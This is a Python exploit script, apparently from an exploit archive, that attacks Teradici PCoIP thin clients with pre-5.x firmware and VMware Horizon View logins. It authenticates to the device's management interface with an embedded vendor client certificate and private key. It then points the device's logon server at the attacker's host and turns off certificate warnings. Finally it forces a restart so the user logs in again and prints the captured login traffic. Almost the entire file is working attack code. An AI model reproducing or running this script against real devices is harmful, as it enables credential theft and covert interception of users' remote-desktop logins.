#!/usr/bin/python
"""
	Exploit Title: Teradici PCoIP <= 4.x and VMware Horizon View MitM

	Reconfigures victim devices to use a MitM without password
	Disables warnings about invalid SSL certificates on victim devices that support them
	Captures logins to VMware Horizon View with MitM
	Attack can be relatively transparent to victim users

	Usage:
	./pcoip-horizon-mitm.py [victim pcoip thin client device ip 'RHOST'] [your ip 'LHOST'] [port for MitM 'LPORT']

	Test Configuration:
		Attacker: Kali Rolling
		Victim: Tera1-based WYSE P20/D200 thin client device running firmware 4.7
		Server: VMware Horizon View 6.0

	Underlying security issue affects Tera1 and Tera2 thin clients
	w/ firmware before 5.x, but configurations besides the above may
	require adjustment(s)

	In particular, if UNSUPPORTED_PROTOCOL errors:
	Older versions of PCoIP firmware don't understand TLS and only support SSL
	You may need to recompile your SSL/TLS library to support older protocols

	Author: teradici-tomochan

	Vendor Homepage: http://www.teradici.com/

	Submission Date: 2017-01-01
		Tera1 cannot be updated and is now EoL
		Tera2 has had firmware 5.x for more than 1 year

	Musings:
	Considering all the users and investors of PCoIP products -
	education, healthcare, government, spies, fortune 500 -
	it seems disheartening that a simple oversight could survive for half a decade
	Then again, F5 made a similar mistake

	Legal Musings:
	Fair dealing/use allows criticism/research/study/education
	Oracle v Google - API reimplementation is fair use in US
	Numbers are not copyrightable, and crypto keys are glorified numbers
"""

import httplib
import os
import socket
import ssl
import sys
import tempfile
import threading
import xml.etree.ElementTree as ElementTree

# basic parameter check
if len(sys.argv) != 4:
	print sys.argv[0], "[victim pcoip thin client device ip 'RHOST'] [your ip 'LHOST'] [port for MitM 'LPORT']"
	sys.exit(1)

# major variables
RHOST = sys.argv[1]
LHOST = sys.argv[2]
LPORT = int(sys.argv[3])

RPORT = 50000

CLIENT_CERTFILE = tempfile.NamedTemporaryFile()

SERVER_CERTFILE = tempfile.NamedTemporaryFile()

# found within Teradici's software
CLIENT_CERTFILE.write("""
-----BEGIN CERTIFICATE-----
MIIDJDCCAgygAwIBAgIJAMW4gkQr3113MA0GCSqGSIb3DQEBBQUAMC0xEzARBgNV
BAoTClBDb0lQIFJvb3QxFjAUBgNVBAMTDVBDb0lQIFJvb3QgQ0EwHhcNMDYwODIx
MTYxODU0WhcNMjYwODE2MTYxODU0WjA9MRIwEAYDVQQKEwlQQ29JUCBDTVMxGTAX
BgNVBAsTEHRlcmEgQ01TIHRlc3RiZWQxDDAKBgNVBAMTA2NtczCBnzANBgkqhkiG
9w0BAQEFAAOBjQAwgYkCgYEA5F9K9KAPiP1Xj2wnSb56qfYXjN8rEMAbAVGvmN9W
C88lnyqBuEsPC47pege7UMAi1EqmkE+qk1Ul8HRKsj+2GxG2uMYQQTDeo53zdwf2
WD1uXUfcRwBMxxJ6K5OWCHAuhZSwRUGNGBvauIXvOFrMzanuEVf17kCeREKCIX5p
WoECAwEAAaOBujCBtzAJBgNVHRMEAjAAMCwGCWCGSAGG+EIBDQQfFh1PcGVuU1NM
IEdlbmVyYXRlZCBDZXJ0aWZpY2F0ZTAdBgNVHQ4EFgQULkg8b8gWSn1sPxXBT56a
tBc9IM8wXQYDVR0jBFYwVIAUpEuDdUPn5OBO9a2zv5tUOfrEbv+hMaQvMC0xEzAR
BgNVBAoTClBDb0lQIFJvb3QxFjAUBgNVBAMTDVBDb0lQIFJvb3QgQ0GCCQC2oRrW
SCjrdDANBgkqhkiG9w0BAQUFAAOCAQEA5CjLoF5WLEe4oJYSGPynbIjw+Zeefqn7
6vnMv0lKJ+xxOh6l+wI0GYEV6HcZHwmjK/+d+6TqhU+bvVPC/ESkaBcywgs4DRvP
Y+gh8Onw06F1x3SdgFTG9WBEWp2Z3wuFVRA58r8S6BCtpTRP7hVHImKTX97tcioT
vB3GMvRS0MHALfNGLltLTcqgeLzxCjXPwddmiZkjLZNYrlhhIO8cdPgeFLr/btcp
/H2EgrxiJ1Y4glboM39C7Y/kYWKln7/UAgga6JHAabxRZUpZqe/85OX/7oNfqM4z
FVRM9qEI98HgccX2v/GvGPf2i7RP6rmubemfU8DiT0BmQ6AR65imsQ==
-----END CERTIFICATE-----
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDkX0r0oA+I/VePbCdJvnqp9heM3ysQwBsBUa+Y31YLzyWfKoG4
Sw8Ljul6B7tQwCLUSqaQT6qTVSXwdEqyP7YbEba4xhBBMN6jnfN3B/ZYPW5dR9xH
AEzHEnork5YIcC6FlLBFQY0YG9q4he84WszNqe4RV/XuQJ5EQoIhfmlagQIDAQAB
AoGAB4tSWZR0Du13mAhVn+0H9ldn3cJ9lLcT7U46g81U9VzpfEGWOXVZUONuuRZK
TNecDvFMYVYQZ3+XmkLtOMg8BsbmQnUawb36slrJ2kZrsGfPo1woZT07pyOAJM6V
txQ0M4tApvQjNTu85M3JvpaAyg8kfOkjbE+kjL6un+8AQ/ECQQD/WURXRPerZrmx
AOk5N2i/DS79KrrnRWEjoin8J+XlG1Mwss2XcqLkZPPj3uidDnNZcKetUV9aEhzg
0YSmUGAtAkEA5PRpRlQ7mYSlDLsW8HMpQZi8U/IP3c0PPcxDfGieABqtEzSp0zvC
UZO8/Bn2jiogJWJUEmwaL2cY7aXl2G3EJQJBAMVmVRbCElVHDLZxZdr9otRPdMvy
hJrVX8sUSjDNB0SeYyl6kMVLsfGuuXynjlwcF8BE/ttV1Mjkx75lOo74A+ECQQDg
yJF/Kf3lyFQfPqPT6MytiV4E8NfhBI2dN6leQHw3T/lyrLa7G6W5X9ogjQEDLJqo
+XPfLmE6/vZ7g/A4X/Q9AkEA21n1SvGVAgbNTNpZHU3XsOxBd/ii2w1QtYSfb8ys
6ukWc0+gQSdEa99dSsxIn5gAZlYZUW8v1waBIzcGBatONQ==
-----END RSA PRIVATE KEY-----
""")

CLIENT_CERTFILE.flush()

# debian's snake oil cert, could be replaced if you so choose
SERVER_CERTFILE.write("""
-----BEGIN CERTIFICATE-----
MIICrjCCAZagAwIBAgIJAK9bA+Vvt19FMA0GCSqGSIb3DQEBCwUAMA8xDTALBgNV
BAMMBGthbGkwHhcNMTQxMTA1MTAyODM0WhcNMjQxMTAyMTAyODM0WjAPMQ0wCwYD
VQQDDARrYWxpMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuUs04WCx
FNsCkFOSg+BjEv8I7LwJ+7kXEgRhTe6iTB7yeyZPqWc7vnXqaRnt1jKIulbxRIJI
L5V9QOVKpnCaTdi9gqef9D1wkfZ4n5x+59GsiKsdxSPO4CrlhglTAodK2zACZI0d
Sd8kxAjTPMRNitIVpvPBWZdqMkhUZN9xV9rneW9iTjjy5MjpIa3Bc+kXt8BmwjRJ
pP2yw+0zjz9a7ztBj+8a/nKOW9DlkCLAqWF+Y0QO+Wha3RF7Tkily7/Trwl5k2bq
v9cWYLfT7hKcnad7L+djZAPFpIPJJwPhx2jOrom2ZpDjLFTObmn0iD2VnuWZVYwS
oTLChf0qs5tgJwIDAQABow0wCzAJBgNVHRMEAjAAMA0GCSqGSIb3DQEBCwUAA4IB
AQCbxAZ8iox0aT9Okpcy3XiWnSoa2KmwkzSYqvyT3Tkhb7Iq9OO89zKLhmu+M1Kv
C9rZkn5Lkv0CTKd6K9ph+dIxyukgCW98O4NbnUCdwgtHVuH246LU/m7o/uuWa2bu
Mutny0hJL1MvItcrG1/+4kyTWfePKJLaZviXFen7y8x897xxMAR/M7l01gC5XDYc
m34jDFicClfhzCzM3OZ50MCdAgjMX0KFRSjeW9SDQqQ9UsGCE+cgt7KlrDGuw61G
7wANSijAFp9SC1vkfHEbso1O3P50lTBhVYnrE6rxW3Kk9DDO9KUDBReWNbWKaZNF
/hQldhR8lnUff5OwbEOauJBh
-----END CERTIFICATE-----
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC5SzThYLEU2wKQ
U5KD4GMS/wjsvAn7uRcSBGFN7qJMHvJ7Jk+pZzu+deppGe3WMoi6VvFEgkgvlX1A
5UqmcJpN2L2Cp5/0PXCR9nifnH7n0ayIqx3FI87gKuWGCVMCh0rbMAJkjR1J3yTE
CNM8xE2K0hWm88FZl2oySFRk33FX2ud5b2JOOPLkyOkhrcFz6Re3wGbCNEmk/bLD
7TOPP1rvO0GP7xr+co5b0OWQIsCpYX5jRA75aFrdEXtOSKXLv9OvCXmTZuq/1xZg
t9PuEpydp3sv52NkA8Wkg8knA+HHaM6uibZmkOMsVM5uafSIPZWe5ZlVjBKhMsKF
/Sqzm2AnAgMBAAECggEAAy+25hVKlkg54A9/2oK2UXJPTfrh1RFWwzmODtAGvHZf
xxxejFQ5I8pVUJ9ghqlxznqGRZ5T7XWNpNsMkJYpISOUBrYpOwL/d5MceeowCH6D
kAoZRfWariIutkJcyhNXhzNpJx+CHG4Y7MIWF9psVvHL64YPkiHXcqvpv55UDaWv
jTr3St6vLIhC68ftDyLiMwzN2KzbfO1F4wxzHeepMMwPIK/kVpY16q0Lh6fCcRBf
Eu3gXJ9P8nKgbGsmjjD7PlavUelBOJnvleTmeOShN6+Y9h5Ii4ShyhffYP9VEbQs
w1jHPWFnIJMsZ0v6JxC+BS9hFfkCfDQk8rN6CQ9VOQKBgQDewOg3R/NT8RdGYXXY
xOay6oA6B7CnkCNAc6RspzW0w4W+EIPmwfpRINnCtWvZUJl3zKmEI8u94wTwgruS
GlWBAYXwLaVuYKKBUST8qDHrs31qtsnvm3Ui2MPeLRx2zt8vbvmlwUXyg3SLtwTV
H1Aq83Bd8aeBj4gLwT9Muho+KwKBgQDU8wP7lkqbuP1mxe6TQqvFz4V6wogjm2Gk
5TgoRiEGJuHTSSAC1eZLHMNMfb5gr5iFCyTPxnd1R5rEtWMPTKpH7dBkPILDDHyM
A2yYoELLpZtEGeID17xzYjNuTKceaZqNaXZ9pHcejKQR/8UbFZYrw+ZKwa9PJYNh
2VDk5Poj9QKBgCDqOGYSx63brijENfm1/rDpXdE1WbEo50yaye0UOCdhzN1s61Cp
0Sczx3mx/SG7ezHsmA/iijSg2xX++2B3a7MIWpZG6G8K8HhTWTfMUrQVba7bG7PA
MOrZRPgLim0z3F7R8ym/CWrwacRLYvdrDRmLp0r6bloCr4OtJoFb7ozJAoGADZx+
66zelfeMEu6h4j3HtvwdvwwCIayD4ENahJB++eKwWo35AtVjQ/fRr+j1qz5uFErz
DmjUJ+XsyZgCfe7bj39u64lGnmsE5votDdBolJXAR+kTnkVC4Wksemdh4zrCyzkr
frptdsFsl03u7l1B3QhHhw28Q+XU8QMv/YF5T6UCgYAmO1J+QRrHVaz+JiKMzgap
1iM15W0CbFw01kF2sI+Ue4q5Q2mYUQzBZ43ISCXaqS3oO51oGcN8a4/p0WR6qq1a
vLlfktlwmAt0uVsGUFrnvmF5idB4p4fkvBxSTspcINsVTJd++yGsrA7WQQLNXdTo
FWB5Orb27emWyfzUXAnZdw==
-----END PRIVATE KEY-----
""")

SERVER_CERTFILE.flush()

# method for generating SSL-friendly SSLContext for older peers
def get_auto_SSLContext():
	ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
	ctx.options &= ~ssl.OP_NO_SSLv2
	ctx.options &= ~ssl.OP_NO_SSLv3
	return ctx

# method for sending SOAP req to device
def query_device(xml):
	conn = httplib.HTTPSConnection(
		RHOST,
		RPORT,
		CLIENT_CERTFILE.name,
		CLIENT_CERTFILE.name,
		context = get_auto_SSLContext()
	)
	conn.putrequest('POST', '/')
	conn.endheaders()
	conn.send(xml)
	rsp = ElementTree.fromstring(conn.getresponse().read())
	conn.close()
	return rsp

# initial connectivity check
try:
	version_resp = query_device('<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:pcoip="http://www.pcoip.org/2006/XMLSchema" xmlns:SOAP-RPC="http://www.w3.org/2003/05/soap-rpc"><SOAP-ENV:Body><pcoip:getProvisionedId SOAP-ENV:encodingStyle="http://www.w3.org/2003/05/soap-encoding"></pcoip:getProvisionedId></SOAP-ENV:Body></SOAP-ENV:Envelope>')
	print "Firmware version", version_resp.find(".//firmwareVersion").text
except:
	print """
Initial connectivity/compatibility check failed

SSL error?
	Try recompiling SSL/TLS library with support for older SSL protocols
Socket error?
	Thin client devices with remote management disabled cannot be exploited, check port 50000
General
	Check the device is actually a Teradici PCoIP thin client device with firmware < 5.x
"""
	raise

# do some checks to verify normal PCoIP and VMware Horizon View setup

# check sessionConnectionType
resp = query_device('<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:pcoip="http://www.pcoip.org/2006/XMLSchema" xmlns:SOAP-RPC="http://www.w3.org/2003/05/soap-rpc"><SOAP-ENV:Body><pcoip:getSecondaryAttrib SOAP-ENV:encodingStyle="http://www.w3.org/2003/05/soap-encoding"><secondaryAttribNameParams xsi:type="pcoip:secondaryAttribNameParamsType"><name xsi:type="xsd:string">sessionConnectionType</name></secondaryAttribNameParams></pcoip:getSecondaryAttrib></SOAP-ENV:Body></SOAP-ENV:Envelope>')
val = resp.find(".//value").text
if val != "2":
	print "Incorrect sessionConnectionType", val
	print "Aborting"
	sys.exit(1)

# check enableVdmKioskMode
resp = query_device('<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:pcoip="http://www.pcoip.org/2006/XMLSchema" xmlns:SOAP-RPC="http://www.w3.org/2003/05/soap-rpc"><SOAP-ENV:Body><pcoip:getVdmKioskMode SOAP-ENV:encodingStyle="http://www.w3.org/2003/05/soap-encoding"></pcoip:getVdmKioskMode></SOAP-ENV:Body></SOAP-ENV:Envelope>')
val = resp.find(".//enableVdmKioskMode").text
if val != "false":
	print "Incorrect enableVdmKioskMode", val
	print "Aborting"
	sys.exit(1)

# check vdmLogonMode
resp = query_device('<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:pcoip="http://www.pcoip.org/2006/XMLSchema" xmlns:SOAP-RPC="http://www.w3.org/2003/05/soap-rpc"><SOAP-ENV:Body><pcoip:getVdmLogon SOAP-ENV:encodingStyle="http://www.w3.org/2003/05/soap-encoding"></pcoip:getVdmLogon></SOAP-ENV:Body></SOAP-ENV:Envelope>')
val = resp.find(".//vdmLogonMode").text
if val != "vdmLogonModeManual":
	print "Incorrect vdmLogonMode", val
	print "Aborting"
	sys.exit(1)

# get VMware Horizon View logon server
resp = query_device('<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:pcoip="http://www.pcoip.org/2006/XMLSchema" xmlns:SOAP-RPC="http://www.w3.org/2003/05/soap-rpc"><SOAP-ENV:Body><pcoip:getVdm SOAP-ENV:encodingStyle="http://www.w3.org/2003/05/soap-encoding"></pcoip:getVdm></SOAP-ENV:Body></SOAP-ENV:Envelope>')
orig_server = resp.find(".//vdmServerAddress").text
orig_port = int(resp.find(".//vdmServerPort").text)
orig_use_ssl = resp.find(".//enableVdmSsl").text
orig_auto_connect = resp.find(".//enableVdmAutoConnect").text

print "Original logon server is", ("%s://%s:%s/" % ("https" if orig_use_ssl == "true" else "http", orig_server, orig_port))

# check that we can connect to the logon server
try:
	conn = None

	if orig_use_ssl == "true":
		conn = httplib.HTTPSConnection(
			orig_server,
			orig_port,
			context = get_auto_SSLContext()
		)
	else:
		conn = httplib.HTTPConnection(
			orig_server,
			orig_port
		)

	conn.putrequest('GET', '/')
	conn.endheaders()
	conn.getresponse().status
	conn.close()
except:
	print "Error connecting to original logon server"
	print "Aborting"
	raise

# try to check vcsCertificateCheckMode
# older firmware didn't support SSL cert checking
orig_cert_check = None
try:
	resp = query_device('<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:pcoip="http://www.pcoip.org/2006/XMLSchema" xmlns:SOAP-RPC="http://www.w3.org/2003/05/soap-rpc"><SOAP-ENV:Body><pcoip:getSecondaryAttrib SOAP-ENV:encodingStyle="http://www.w3.org/2003/05/soap-encoding"><secondaryAttribNameParams xsi:type="pcoip:secondaryAttribNameParamsType"><name xsi:type="xsd:string">vcsCertificateCheckMode</name></secondaryAttribNameParams></pcoip:getSecondaryAttrib></SOAP-ENV:Body></SOAP-ENV:Envelope>')
	orig_cert_check = resp.find(".//value").text
	if orig_cert_check is not None and orig_cert_check != '2':
		print "Target device configured to warn for insecure SSL certs; will disable"
except:
	orig_cert_check = None

if orig_cert_check is None:
	print "Target device does not support SSL cert validity checking"

# attempt to bind to LPORT
s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_socket.bind((LHOST, LPORT))
s_socket.listen(8)

# handle incoming connections
def proxy_worker(src_socket, src_socket_label, dst_socket, dst_socket_label):
	while 1:
		recv_data = src_socket.recv(4096)
		if recv_data == '':
			dst_socket.shutdown(socket.SHUT_WR)
			break
		print id(src_socket), src_socket_label, "=>", dst_socket_label, id(dst_socket)
		print recv_data
		dst_socket.sendall(recv_data)

def accepting_worker():
	proxy_threads = []
	while 1:
		(device_socket, addr) = s_socket.accept()
		device_socket = ssl.wrap_socket(
			device_socket,
			SERVER_CERTFILE.name,
			SERVER_CERTFILE.name,
			True,
			ssl_version = ssl.PROTOCOL_SSLv23
			)

		login_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		login_socket.connect((orig_server, orig_port))
		if orig_use_ssl == "true":
			login_socket = ssl.wrap_socket(
				login_socket,
				ssl_version = ssl.PROTOCOL_SSLv23
				)

		t = threading.Thread(target=proxy_worker, args=(device_socket,"D",login_socket,"S",))
		proxy_threads.append(t)
		t.start()

		t = threading.Thread(target=proxy_worker, args=(login_socket,"S",device_socket,"D",))
		proxy_threads.append(t)
		t.start()

accept_thread = threading.Thread(target=accepting_worker)
accept_thread.start()

print "MitM traffic will be written to stdout"

# reconfigure device to use MitM
query_device('<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:pcoip="http://www.pcoip.org/2006/XMLSchema" xmlns:SOAP-RPC="http://www.w3.org/2003/05/soap-rpc"><SOAP-ENV:Body><pcoip:setVdm SOAP-ENV:encodingStyle="http://www.w3.org/2003/05/soap-encoding"><vdmParams xsi:type="pcoip:vdmParamsType"><vdmServerAddress xsi:type="xsd:string">' + LHOST + '</vdmServerAddress><vdmServerPort xsi:type="xsd:unsignedInt">' + str(LPORT) + '</vdmServerPort><enableVdmSsl xsi:type="xsd:boolean">true</enableVdmSsl><enableVdmAutoConnect xsi:type="xsd:boolean">true</enableVdmAutoConnect></vdmParams></pcoip:setVdm></SOAP-ENV:Body></SOAP-ENV:Envelope>')

if orig_cert_check is not None:
	query_device('<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:pcoip="http://www.pcoip.org/2006/XMLSchema" xmlns:SOAP-RPC="http://www.w3.org/2003/05/soap-rpc"><SOAP-ENV:Body><pcoip:setSecondaryAttrib SOAP-ENV:encodingStyle="http://www.w3.org/2003/05/soap-encoding"><secondaryAttribParams xsi:type="pcoip:secondaryAttribParamsType"><name xsi:type="xsd:string">vcsCertificateCheckMode</name><value xsi:type="xsd:unsignedInt">2</value></secondaryAttribParams></pcoip:setSecondaryAttrib></SOAP-ENV:Body></SOAP-ENV:Envelope>')

# immediately prompt for re-login by restarting device
query_device('<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:pcoip="http://www.pcoip.org/2006/XMLSchema" xmlns:SOAP-RPC="http://www.w3.org/2003/05/soap-rpc"><SOAP-ENV:Body><pcoip:resetPcoipProcessor SOAP-ENV:encodingStyle="http://www.w3.org/2003/05/soap-encoding"></pcoip:resetPcoipProcessor></SOAP-ENV:Body></SOAP-ENV:Envelope>')

# continue acting as a MitM until told to stop
print """
Tap the <Enter> key to stop the MitM and restore original settings

Note, this exploit only performs MitM for
listening of login and desktop selection

It does NOT rewrite the traffic during desktop selection,
which includes the IP address of the desktop to be viewed;
the remote desktop session itself is NOT MitM'd

It is safe to discontinue this MitM after the user
has logged in and is interacting with their desktop

If some user never logged in, click the Cancel button
in the device's GUI, or restart the device
(see this code for an example of restarting remotely)
"""
sys.stdin.readline()

# reconfigure device to use original logon server
query_device('<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:pcoip="http://www.pcoip.org/2006/XMLSchema" xmlns:SOAP-RPC="http://www.w3.org/2003/05/soap-rpc"><SOAP-ENV:Body><pcoip:setVdm SOAP-ENV:encodingStyle="http://www.w3.org/2003/05/soap-encoding"><vdmParams xsi:type="pcoip:vdmParamsType"><vdmServerAddress xsi:type="xsd:string">' + orig_server + '</vdmServerAddress><vdmServerPort xsi:type="xsd:unsignedInt">' + str(orig_port) + '</vdmServerPort><enableVdmSsl xsi:type="xsd:boolean">' + orig_use_ssl + '</enableVdmSsl><enableVdmAutoConnect xsi:type="xsd:boolean">' + orig_auto_connect + '</enableVdmAutoConnect></vdmParams></pcoip:setVdm></SOAP-ENV:Body></SOAP-ENV:Envelope>')

if orig_cert_check is not None:
	query_device('<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:pcoip="http://www.pcoip.org/2006/XMLSchema" xmlns:SOAP-RPC="http://www.w3.org/2003/05/soap-rpc"><SOAP-ENV:Body><pcoip:setSecondaryAttrib SOAP-ENV:encodingStyle="http://www.w3.org/2003/05/soap-encoding"><secondaryAttribParams xsi:type="pcoip:secondaryAttribParamsType"><name xsi:type="xsd:string">vcsCertificateCheckMode</name><value xsi:type="xsd:unsignedInt">' + orig_cert_check + '</value></secondaryAttribParams></pcoip:setSecondaryAttrib></SOAP-ENV:Body></SOAP-ENV:Envelope>')

CLIENT_CERTFILE.close()
SERVER_CERTFILE.close()

os._exit(0)
